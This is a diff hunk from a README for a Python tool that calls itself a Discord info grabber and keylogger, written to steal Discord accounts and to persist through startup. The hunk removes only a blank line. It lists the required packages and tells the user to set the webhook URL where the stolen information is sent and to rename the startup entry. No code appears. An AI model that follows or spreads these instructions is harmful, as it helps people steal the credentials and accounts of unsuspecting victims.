@@ -2,7 +2,6 @@
 This is a Discord info grabber and keylogger. It can be used to to steal discord account's and it is added to startup for persistence.
 
 Here is a list of what you need to do:
-
 pip install's: requests, pynput, pyperclip, pycryptodome, psutil, pywin32.
 Replace webhook url with the one you want the info to be sent to.
 You would want to change the rename of the startup.
